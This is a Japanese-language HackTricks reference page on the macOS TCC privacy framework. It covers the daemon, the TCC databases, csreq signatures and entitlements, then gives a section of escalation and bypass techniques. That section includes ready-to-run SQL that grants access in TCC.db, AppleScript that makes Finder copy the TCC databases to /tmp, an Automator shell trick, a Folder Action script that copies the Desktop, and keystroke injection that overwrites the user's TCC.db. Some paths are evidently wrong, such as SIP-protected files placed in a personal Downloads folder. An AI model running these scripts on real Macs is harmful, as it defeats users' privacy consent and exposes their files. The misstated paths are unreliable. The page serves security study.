# macOS TCC

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローする
- **HackTricks**および**HackTricks Cloud**のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する

</details>

## **基本情報**

**TCC（Transparency, Consent, and Control）**は、アプリケーションの権限を規制することに焦点を当てたセキュリティプロトコルです。その主な役割は、**位置情報サービス、連絡先、写真、マイク、カメラ、アクセシビリティ、およびフルディスクアクセス**などの機密機能を保護することです。これらの要素へのアプリのアクセスを許可する前に明示的なユーザーの同意を義務付けることで、TCCはプライバシーを強化し、ユーザーがデータを制御できるようにします。

ユーザーは、アプリケーションが保護された機能へのアクセスをリクエストするときにTCCに遭遇します。これは、ユーザーが**アクセスを承認または拒否**することができるプロンプトを介して可視化されます。さらに、TCCは、**ファイルをアプリケーションにドラッグアンドドロップする**などの直接的なユーザーアクションを受け入れ、特定のファイルへのアクセスを許可することにより、アプリケーションが明示的に許可されたものだけにアクセスできるようにします。

![TCCプロンプトの例](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC**は、`/System/Library/PrivateFrameworks/TCC.framework/Support/tccd`にある**デーモン**によって処理され、`/System/Library/LaunchDaemons/com.apple.tccd.system.plist`で構成されています（`com.apple.tccd.system`マッチサービスを登録）。

ログインしているユーザーごとに定義された**ユーザーモードのtccd**が`/System/Library/LaunchAgents/com.apple.tccd.plist`に実行され、`com.apple.tccd`および`com.apple.usernotifications.delegate.com.apple.tccd`のマッチサービスを登録しています。

ここでは、システムとユーザーとして実行されているtccdを見ることができます。
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
アプリケーションは**親から継承された権限**を持ち、**Bundle ID**と**Developer ID**に基づいて**権限が追跡**されます。

### TCC データベース

許可/拒否は次の TCC データベースに保存されます:

- **`/Library/Application Support/com.apple.TCC/TCC.db`** にあるシステム全体のデータベース。
- このデータベースは**SIP 保護**されており、SIP バイパスのみが書き込めます。
- ユーザー TCC データベース **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** はユーザーごとの設定に使用されます。
- このデータベースは、**FDA**などの高いTCC権限を持つプロセスのみが書き込めます（ただし、SIP によって保護されていません）。

{% hint style="warning" %}
前述のデータベースは読み取りアクセスに対しても**TCC 保護**されています。したがって、通常のユーザー TCC データベースを読み取ることはできません（TCC 権限を持つプロセスからでない限り）。

ただし、**FDA**や**`kTCCServiceEndpointSecurityClient`**などの高い権限を持つプロセスは、ユーザーのTCCデータベースに書き込むことができます。
{% endhint %}

- **`/var/db/locationd/clients.plist`** には、**位置情報サービスにアクセスを許可されたクライアント**を示す第三のTCCデータベースがあります。
- SIP 保護ファイル **`/Users/carlospolop/Downloads/REG.db`**（TCC による読み取りアクセスも保護されています）には、すべての**有効なTCCデータベースの場所**が含まれています。
- SIP 保護ファイル **`/Users/carlospolop/Downloads/MDMOverrides.plist`**（TCC による読み取りアクセスも保護されています）には、さらにTCCが許可された権限が含まれています。
- SIP 保護ファイル **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`**（誰でも読めます）は、TCC例外が必要なアプリケーションの許可リストです。

{% hint style="success" %}
**iOS**のTCCデータベースは**`/private/var/mobile/Library/TCC/TCC.db`**にあります。
{% endhint %}

{% hint style="info" %}
**通知センターUI**は**システムTCCデータベース**に変更を加えることができます:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

ただし、ユーザーは**`tccutil`**コマンドラインユーティリティを使用して、**ルールを削除したりクエリしたり**することができます。
{% endhint %}

#### データベースのクエリ

{% tabs %}
{% tab title="ユーザーDB" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="システムDB" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
両方のデータベースをチェックすると、アプリが許可した権限、禁止した権限、または持っていない権限（求められることがある）を確認できます。
{% endhint %}

- **`service`** は TCC **権限**の文字列表現です
- **`client`** は権限を持つ **バンドルID** または **バイナリのパス** です
- **`client_type`** はバンドル識別子（0）か絶対パス（1）かを示します

<details>

<summary>絶対パスの場合の実行方法</summary>

単に **`launctl load you_bin.plist`** を実行します。plistは以下のようになります:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* **`auth_value`** には、denied(0)、unknown(1)、allowed(2)、limited(3) の異なる値があります。
* **`auth_reason`** には、次の値が入ります: Error(1)、User Consent(2)、User Set(3)、System Set(4)、Service Policy(5)、MDM Policy(6)、Override Policy(7)、Missing usage string(8)、Prompt Timeout(9)、Preflight Unknown(10)、Entitled(11)、App Type Policy(12)
* **csreq** フィールドは、実行するバイナリの検証方法とTCC権限を付与する方法を示すために存在します:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* テーブルの**他のフィールド**に関する詳細は、[このブログ投稿](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)をチェックしてください。

また、`システム環境設定 --> セキュリティとプライバシー --> プライバシー --> ファイルとフォルダ`でアプリケーションに**すでに与えられた権限**を確認できます。

{% hint style="success" %}
ユーザーは、**`tccutil`**を使用して**ルールを削除またはクエリ**できます。
{% endhint %}

#### TCC権限のリセット
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC シグネチャチェック

TCC **データベース** はアプリケーションの **Bundle ID** を保存しますが、**許可を求める**アプリが正しいものであることを確認するために、**シグネチャ** に関する**情報** も保存します。

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
したがって、同じ名前とバンドルIDを使用する他のアプリケーションは、他のアプリに付与された権限にアクセスできません。
{% endhint %}

### エンタイトルメント＆TCC権限

アプリケーションは、リソースにアクセスをリクエストし、許可されただけでなく、関連するエンタイトルメントを持っている必要があります。\
たとえば、Telegramは、カメラへのアクセスをリクエストするためのエンタイトルメント`com.apple.security.device.camera`を持っています。このエンタイトルメントを持たないアプリケーションは、カメラにアクセスできません（ユーザーにはアクセス許可を求められません）。

ただし、`~/Desktop`、`~/Downloads`、`~/Documents`などの特定のユーザーフォルダにアクセスするためには、特定のエンタイトルメントを持っている必要はありません。システムはアクセスを透過的に処理し、必要に応じてユーザーにプロンプトを表示します。

Appleのアプリケーションはプロンプトを生成しません。それらにはエンタイトルメントリストに事前に付与された権利が含まれており、ポップアップを生成することは決してありませんし、TCCデータベースのいずれにも表示されません。例：
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
これにより、カレンダーがユーザーにリマインダー、カレンダー、アドレス帳へのアクセスを求めることを回避できます。

{% hint style="success" %}
エンタイトルメントに関する公式ドキュメントに加えて、[https://newosxbook.com/ent.jl](https://newosxbook.com/ent.jl) でエンタイトルメントに関する非公式な興味深い情報を見つけることも可能です。
{% endhint %}

一部のTCC権限には、kTCCServiceAppleEvents、kTCCServiceCalendar、kTCCServicePhotosなどがあります。これらをすべて定義する公開リストはありませんが、[既知のリスト](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)を確認できます。

### 保護されていない機密情報が含まれる場所

- $HOME（自体）
- $HOME/.ssh、$HOME/.aws など
- /tmp

### ユーザーの意図 / com.apple.macl

以前に述べたように、ファイルをアプリにドラッグ＆ドロップすることで、そのアプリにファイルへのアクセスを許可することが可能です。このアクセスはTCCデータベースには特定されませんが、ファイルの拡張属性として保存されます。この属性には許可されたアプリのUUIDが保存されます。
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
**`com.apple.macl`**属性が**Sandbox**によって管理されている点が興味深いですが、tccdではありません。

また、コンピュータ内のアプリのUUIDを許可するファイルを別のコンピュータに移動すると、同じアプリでも異なるUIDを持つため、そのアプリにアクセス権が付与されません。
{% endhint %}

拡張属性`com.apple.macl`は、他の拡張属性とは異なり、**SIPによって保護**されているため、**消去できません**。ただし、[**この投稿で説明されているように**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)、ファイルを**圧縮**して、**削除**して、**解凍**することで無効にすることが可能です。

## TCC特権昇格とバイパス

### TCCに挿入

ある時点でTCCデータベースに対して書き込みアクセス権を取得できた場合、以下のような方法でエントリを追加できます（コメントを削除してください）：

<details>

<summary>TCCに挿入の例</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC ペイロード

アプリ内でいくつかの TCC 権限を取得した場合は、次のページをチェックして TCC ペイロードを悪用してください:

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### 自動化（Finder）から FDA\*

自動化権限の TCC 名は: **`kTCCServiceAppleEvents`**\
この特定の TCC 権限は、TCC データベース内で管理できる**アプリケーション**を示しています（つまり、権限はすべてを管理するだけでなく、特定のアプリケーションを管理することもできます）。

**Finder** は、**常に FDA を持っています**（UI に表示されなくても）、そのため、それに対して **Automation** 権限がある場合、その権限を悪用して **いくつかのアクションを実行**させることができます。\
この場合、あなたのアプリは **`com.apple.Finder`** 上で **`kTCCServiceAppleEvents`** の許可が必要です。

{% tabs %}
{% tab title="ユーザーの TCC.db を盗む" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}

{% tab title="システムのTCC.dbを盗む" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

これを悪用して、**独自のユーザーTCCデータベースを作成**することができます。

{% hint style="warning" %}
この権限を持つと、**FinderにTCC制限フォルダへのアクセスを要求**してファイルを取得することができますが、afaikでは、Finderに任意のコードを実行させることはできないため、完全にFDAアクセスを悪用することはできません。

したがって、FDAの全機能を悪用することはできません。
{% endhint %}

これは、Finderに対してAutomation権限を取得するためのTCCプロンプトです：

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
**Automator**アプリがTCC権限**`kTCCServiceAppleEvents`**を持っているため、Finderのようなアプリを**制御**することができます。したがって、Automatorを制御する権限を持っていると、以下のコードのように**Finder**を制御することもできます：
{% endhint %}

<details>

<summary>Automator内でシェルを取得</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

**スクリプトエディターアプリ**でも同じことが起こります。Finderを制御できますが、AppleScriptを使用してスクリプトを実行することはできません。

### オートメーション（SE）への一部のTCC

**システムイベントはフォルダアクションを作成でき、フォルダアクションは一部のTCCフォルダにアクセスできます**（デスクトップ、ドキュメント＆ダウンロード）。したがって、次のようなスクリプトを使用してこの動作を悪用することができます：
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### 自動化（SE）+ アクセシビリティ（**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**）によるFDA\*

**`System Events`** 上での自動化 + アクセシビリティ（**`kTCCServicePostEvent`**）を使用すると、**プロセスにキーストロークを送信**できます。これにより、Finderを悪用してユーザーのTCC.dbを変更したり、FDAを任意のアプリに付与したりすることができます（ただし、これにはパスワードの入力が求められる場合があります）。

FinderによるユーザーのTCC.db 上書きの例：
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility`からFDAへのエスカレーション

[**アクセシビリティ権限を悪用するためのペイロード**](macos-tcc-payloads.md#accessibility)をチェックして、FDA\*にエスカレーションしたり、例えばキーロガーを実行したりできます。

### **エンドポイントセキュリティクライアントからFDAへ**

**`kTCCServiceEndpointSecurityClient`**を持っていれば、FDAを持っています。以上。

### システムポリシーシステム管理者ファイルからFDAへ

**`kTCCServiceSystemPolicySysAdminFiles`**は、ユーザーの**`NFSHomeDirectory`**属性を変更し、ユーザーのホームフォルダを変更することができ、それにより**TCCをバイパス**することができます。

### ユーザーTCCデータベースからFDAへ

ユーザーTCCデータベースに**書き込み権限**を取得すると、自分に**`FDA`**権限を付与することはできませんが、システムデータベースに存在する権限を付与することができます。

しかし、自分に**`Finderへの自動化権限`**を与え、前述の手法を悪用してFDA\*にエスカレーションすることができます。

### **FDAからTCC権限へ**

**フルディスクアクセス**のTCC名は**`kTCCServiceSystemPolicyAllFiles`**です。

これは実際にはリアルなエスカレーションではないと思いますが、念のため便利かもしれません: FDAを持つプログラムを制御できる場合、**ユーザーTCCデータベースを変更して任意のアクセス権を与える**ことができます。これはFDA権限を失った場合の持続性テクニックとして役立つかもしれません。

### **SIPバイパスからTCCバイパスへ**

システムの**TCCデータベース**は**SIP**によって保護されているため、指定された権限を持つプロセスのみがそれを変更できます。したがって、攻撃者が**SIPバイパス**を見つけると、ファイル（SIPによって制限されたファイルを変更できる）を介して次のことができるようになります:

* TCCデータベースの保護を**解除**し、自分にすべてのTCC権限を与えることができます。たとえば、次のファイルを悪用できます:
* TCCシステムデータベース
* REG.db
* MDMOverrides.plist

ただし、この**SIPバイパスをTCCバイパスに悪用**する別のオプションがあります。`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`ファイルは、TCC例外を必要とするアプリケーションの許可リストです。したがって、攻撃者がこのファイルからSIP保護を**解除**し、**独自のアプリケーション**を追加することができれば、そのアプリケーションはTCCをバイパスできるようになります。\
たとえば、ターミナルを追加する場合:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
### AllowApplicationsList.plist:

AllowApplicationsList.plistファイルは、macOSのTCC（Privacy Preferences Policy Control）フレームワークで使用される設定ファイルです。このファイルには、ユーザーがアクセスを許可したアプリケーションのリストが含まれています。 TCCは、カメラ、マイク、ファイル、フォルダーなどのプライバシーセンサーへのアクセスを管理します。このファイルを適切に構成することで、ユーザーが許可したアプリケーションのみが必要なプライバシーセンサーにアクセスできるようになります。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC バイパス

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## 参考文献

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、 [**telegramグループ**](https://t.me/peass) に参加するか、 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) をフォローする。
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。

</details>
